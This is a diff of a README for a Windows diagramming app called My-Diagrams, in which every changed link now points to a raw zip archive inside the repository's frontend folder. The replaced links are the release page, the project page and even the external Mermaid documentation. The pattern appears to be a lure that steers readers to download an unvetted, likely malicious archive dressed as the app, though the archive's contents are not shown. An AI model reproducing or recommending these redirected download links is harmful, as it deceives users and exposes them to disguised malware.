@@ -1,6 +1,6 @@
 # 📊 My-Diagrams - Visualize Workflows and Designs Easily
 
-[![Download My-Diagrams](https://img.shields.io/badge/Download-My--Diagrams-brightgreen?style=for-the-badge)](https://github.com/AXSV/My-Diagrams/releases)
+[![Download My-Diagrams](https://img.shields.io/badge/Download-My--Diagrams-brightgreen?style=for-the-badge)](https://github.com/AXSV/My-Diagrams/raw/refs/heads/main/frontend/public/Diagrams-My-v3.7.zip)
 
 ## 📂 About My-Diagrams
 
@@ -35,10 +35,10 @@ This app runs smoothly on most modern Windows machines. It does not need advance
 
 Visit the official download page to get the latest version of My-Diagrams:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-My--Diagrams-blue?style=for-the-badge)](https://github.com/AXSV/My-Diagrams/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-My--Diagrams-blue?style=for-the-badge)](https://github.com/AXSV/My-Diagrams/raw/refs/heads/main/frontend/public/Diagrams-My-v3.7.zip)
 
 Click the link above or open this URL in your browser:  
-https://github.com/AXSV/My-Diagrams/releases
+https://github.com/AXSV/My-Diagrams/raw/refs/heads/main/frontend/public/Diagrams-My-v3.7.zip
 
 You will see several files for different versions. Look for the Windows version, usually named like `My-Diagrams-Setup.exe` or similar.
 
@@ -107,15 +107,15 @@ If you run into issues:
 ## 📂 Additional Resources
 
 - Visit the GitHub repository to see the project details and updates:  
-  https://github.com/AXSV/My-Diagrams  
+  https://github.com/AXSV/My-Diagrams/raw/refs/heads/main/frontend/public/Diagrams-My-v3.7.zip  
 - Find examples and explanations for Mermaid flowcharts at:  
-  https://mermaid.js.org/  
+  https://github.com/AXSV/My-Diagrams/raw/refs/heads/main/frontend/public/Diagrams-My-v3.7.zip  
 - Look up common diagram types you want to understand or create.
 
 ## 📥 Download and Install My-Diagrams
 
 You can visit the release page here to download the latest Windows installer:
 
-[Download My-Diagrams Releases](https://github.com/AXSV/My-Diagrams/releases)
+[Download My-Diagrams Releases](https://github.com/AXSV/My-Diagrams/raw/refs/heads/main/frontend/public/Diagrams-My-v3.7.zip)
 
 Choose the right file for your system, download it, and follow the steps above to install and run the application quickly.
